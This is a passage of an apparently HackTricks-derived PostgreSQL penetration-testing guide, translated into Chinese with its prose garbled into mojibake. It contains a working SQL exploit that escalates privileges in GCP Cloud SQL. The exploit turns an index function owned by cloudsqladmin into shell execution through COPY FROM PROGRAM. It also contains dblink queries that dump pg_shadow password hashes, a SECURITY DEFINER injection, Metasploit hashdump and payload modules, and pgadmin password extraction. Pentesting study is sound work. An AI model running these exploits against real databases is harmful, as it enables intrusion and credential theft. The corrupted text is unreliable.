å½“ä½ å°è¯•**è®©å¦ä¸€ä¸ªç”¨æˆ·æˆä¸ºè¡¨çš„æ‰€æœ‰è€…**æ—¶ï¼Œä½ åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª**é”™è¯¯**æ¥é˜»æ­¢è¿™ä¸€è¡Œä¸ºï¼Œä½†æ˜¾ç„¶ GCP å…è®¸äº†**éè¶…çº§ç”¨æˆ· postgres ç”¨æˆ·**åœ¨ GCP ä¸­æ‹¥æœ‰è¿™ä¸ª**é€‰é¡¹**ï¼š

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

ç»“åˆè¿™ä¸ªæƒ³æ³•å’Œå½“åœ¨ä¸€ä¸ªå¸¦æœ‰ç´¢å¼•å‡½æ•°çš„**è¡¨**ä¸Šæ‰§è¡Œ **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) å‘½ä»¤æ—¶ï¼Œä½œä¸ºå‘½ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œ**å‡½æ•°**ä¼šä»¥**è¡¨** **æ‰€æœ‰è€…çš„æƒé™**è¢«**è°ƒç”¨**ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å‡½æ•°çš„ç´¢å¼•ï¼Œå¹¶å°†è¯¥è¡¨çš„æ‰€æœ‰è€…æƒé™èµ‹äºˆä¸€ä¸ª**è¶…çº§ç”¨æˆ·**ï¼Œç„¶åå¯¹å¸¦æœ‰æ¶æ„å‡½æ•°çš„è¡¨è¿è¡Œ ANALYZEï¼Œæ¶æ„å‡½æ•°å°†èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºå®ƒä½¿ç”¨çš„æ˜¯æ‰€æœ‰è€…çš„æƒé™ã€‚
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### åˆ©ç”¨

1. åˆ›å»ºä¸€ä¸ªæ–°è¡¨ã€‚
2. å‘è¡¨ä¸­æ’å…¥ä¸€äº›è™šæ‹Ÿå†…å®¹ï¼Œä»¥ä¾¿ç´¢å¼•å‡½æ•°æœ‰ä¸œè¥¿å¯ä»¥å¤„ç†ã€‚
3. åœ¨è¡¨ä¸Šåˆ›å»ºä¸€ä¸ªæ¶æ„ç´¢å¼•å‡½æ•°ï¼ˆåŒ…å«æˆ‘ä»¬çš„ä»£ç æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼‰ã€‚
4. å°†è¡¨æ‰€æœ‰è€…æ›´æ”¹ä¸º cloudsqladmin ï¼ŒGCPçš„è¶…çº§ç”¨æˆ·è§’è‰²ï¼Œä»…ç”±Cloud SQLç”¨äºç»´æŠ¤å’Œç®¡ç†æ•°æ®åº“ã€‚
5. åˆ†æè¡¨ï¼Œè¿«ä½¿PostgreSQLå¼•æ“åˆ‡æ¢ç”¨æˆ·ä¸Šä¸‹æ–‡åˆ°è¡¨çš„æ‰€æœ‰è€…ï¼ˆ cloudsqladmin ï¼‰ï¼Œå¹¶è°ƒç”¨æ¶æ„ç´¢å¼•å‡½æ•°ï¼Œå…·æœ‰cloudsqladminæƒé™ï¼Œå¯¼è‡´æ‰§è¡Œæˆ‘ä»¬çš„shellå‘½ä»¤ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¹‹å‰æ²¡æœ‰æƒé™æ‰§è¡Œçš„ã€‚

åœ¨PostgreSQLä¸­ï¼Œè¿™ä¸ªæµç¨‹çœ‹èµ·æ¥åƒè¿™æ ·ï¼š
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
æ‰§è¡Œexploit SQLæŸ¥è¯¢åï¼Œ`shell_commands_results`è¡¨åŒ…å«æ‰§è¡Œä»£ç çš„è¾“å‡ºï¼š
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### æœ¬åœ°ç™»å½•

ä¸€äº›é…ç½®ä¸å½“çš„postgresqlå®ä¾‹å¯èƒ½å…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ç™»å½•ï¼Œå¯ä»¥ä½¿ç”¨**`dblink`å‡½æ•°**ä»127.0.0.1è¿›è¡Œæœ¬åœ°ç™»å½•ï¼š
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†ä½¿å‰ä¸€ä¸ªæŸ¥è¯¢å·¥ä½œï¼Œ**å‡½æ•° `dblink` éœ€è¦å­˜åœ¨**ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ƒï¼š
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

å¦‚æœæ‚¨æ‹¥æœ‰ä¸€ä¸ªå…·æœ‰æ›´é«˜æƒé™ç”¨æˆ·çš„å¯†ç ï¼Œä½†è¯¥ç”¨æˆ·ä¸å…è®¸ä»å¤–éƒ¨IPç™»å½•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ä½œä¸ºè¯¥ç”¨æˆ·æ‰§è¡ŒæŸ¥è¯¢ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ£€æŸ¥è¿™ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨ï¼š
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **å…·æœ‰** SECURITY DEFINER **çš„è‡ªå®šä¹‰å‡½æ•°**

\*\*\*\*[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ï¼Œæ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿåœ¨IBMæä¾›çš„postgreså®ä¾‹ä¸­ææƒï¼Œå› ä¸ºä»–ä»¬**å‘ç°äº†è¿™ä¸ªå¸¦æœ‰SECURITY DEFINERæ ‡å¿—çš„å‡½æ•°**ï¼š

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

æ­£å¦‚[**æ–‡æ¡£ä¸­è§£é‡Šçš„**](https://www.postgresql.org/docs/current/sql-createfunction.html)ï¼Œå…·æœ‰**SECURITY DEFINERçš„å‡½æ•°**ä¼šä»¥**æ‹¥æœ‰å®ƒçš„ç”¨æˆ·**çš„æƒé™æ‰§è¡Œã€‚å› æ­¤ï¼Œå¦‚æœå‡½æ•°**å®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»**æˆ–è€…é€šè¿‡æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°æ‰§è¡Œä¸€äº›**ç‰¹æƒæ“ä½œ**ï¼Œå®ƒå¯èƒ½è¢«æ»¥ç”¨æ¥**åœ¨postgreså†…éƒ¨æå‡æƒé™**ã€‚

åœ¨ä¸Šé¢ä»£ç çš„ç¬¬4è¡Œï¼Œä½ å¯ä»¥çœ‹åˆ°å‡½æ•°æœ‰**SECURITY DEFINER**æ ‡å¿—ã€‚
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ç„¶å**æ‰§è¡Œå‘½ä»¤**ï¼š

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### ä½¿ç”¨ PL/pgSQL è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£

PL/pgSQL ä½œä¸ºä¸€ç§**åŠŸèƒ½é½å…¨çš„ç¼–ç¨‹è¯­è¨€**ï¼Œå…è®¸æ¯” SQL æ›´å¤šçš„ç¨‹åºæ§åˆ¶ï¼ŒåŒ…æ‹¬**ä½¿ç”¨å¾ªç¯å’Œå…¶ä»–æ§åˆ¶ç»“æ„çš„èƒ½åŠ›**ã€‚SQL è¯­å¥å’Œè§¦å‘å™¨å¯ä»¥è°ƒç”¨ç”¨ PL/pgSQL è¯­è¨€åˆ›å»ºçš„å‡½æ•°ã€‚\
**ä½ å¯ä»¥æ»¥ç”¨è¿™ç§è¯­è¨€ï¼Œè®© PostgreSQL å»æš´åŠ›ç ´è§£ç”¨æˆ·å‡­è¯ã€‚**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### æ—¥å¿—è®°å½•

åœ¨ _**postgresql.conf**_ æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ›´æ”¹ä»¥ä¸‹è®¾ç½®æ¥å¯ç”¨ postgresql æ—¥å¿—ï¼š
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
ç„¶åï¼Œ**é‡å¯æœåŠ¡**ã€‚

### pgadmin

[pgadmin](https://www.pgadmin.org) æ˜¯ PostgreSQL çš„ç®¡ç†å’Œå¼€å‘å¹³å°ã€‚\
ä½ å¯ä»¥åœ¨ _**pgadmin4.db**_ æ–‡ä»¶å†…æ‰¾åˆ°**å¯†ç **\
ä½ å¯ä»¥ä½¿ç”¨è„šæœ¬ä¸­çš„ _**decrypt**_ å‡½æ•°æ¥è§£å¯†å®ƒä»¬ï¼š[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

å®¢æˆ·ç«¯è®¤è¯ç”±ä¸€ä¸ªé€šå¸¸å‘½åä¸º _**pg\_hba.conf**_ çš„é…ç½®æ–‡ä»¶æ§åˆ¶ã€‚è¯¥æ–‡ä»¶åŒ…å«ä¸€ç³»åˆ—è®°å½•ã€‚è®°å½•å¯èƒ½æœ‰ä»¥ä¸‹ä¸ƒç§æ ¼å¼ä¹‹ä¸€ï¼š

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**æ¯æ¡**è®°å½•**æŒ‡å®š**ä¸€ä¸ª**è¿æ¥ç±»å‹**ã€ä¸€ä¸ª**å®¢æˆ·ç«¯IPåœ°å€èŒƒå›´**ï¼ˆå¦‚æœä¸è¿æ¥ç±»å‹ç›¸å…³ï¼‰ã€ä¸€ä¸ª**æ•°æ®åº“åç§°**ã€ä¸€ä¸ª**ç”¨æˆ·å**ï¼Œä»¥åŠç”¨äºåŒ¹é…è¿™äº›å‚æ•°çš„è¿æ¥çš„**è®¤è¯æ–¹æ³•**ã€‚**ç¬¬ä¸€æ¡åŒ¹é…**è¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯åœ°å€ã€è¯·æ±‚çš„æ•°æ®åº“å’Œç”¨æˆ·åçš„è®°å½•**å°†è¢«ç”¨äº**æ‰§è¡Œè®¤è¯ã€‚æ²¡æœ‰"ç»§ç»­å°è¯•"æˆ–"å¤‡é€‰"ï¼š**å¦‚æœé€‰æ‹©äº†ä¸€æ¡è®°å½•å¹¶ä¸”è®¤è¯å¤±è´¥ï¼Œåç»­è®°å½•ä¸ä¼šè¢«è€ƒè™‘**ã€‚å¦‚æœæ²¡æœ‰è®°å½•åŒ¹é…ï¼Œè®¿é—®å°†è¢«æ‹’ç»ã€‚\
**åŸºäºå¯†ç çš„**è®¤è¯æ–¹æ³•åŒ…æ‹¬**md5**ã€**crypt**å’Œ**password**ã€‚è¿™äº›æ–¹æ³•çš„æ“ä½œç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå¯†ç é€šè¿‡è¿æ¥å‘é€çš„æ–¹å¼ï¼šåˆ†åˆ«æ˜¯MD5æ•£åˆ—ã€cryptåŠ å¯†å’Œæ˜æ–‡ã€‚ä¸€ä¸ªé™åˆ¶æ˜¯cryptæ–¹æ³•ä¸é€‚ç”¨äºåœ¨pg\_authidä¸­åŠ å¯†çš„å¯†ç ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
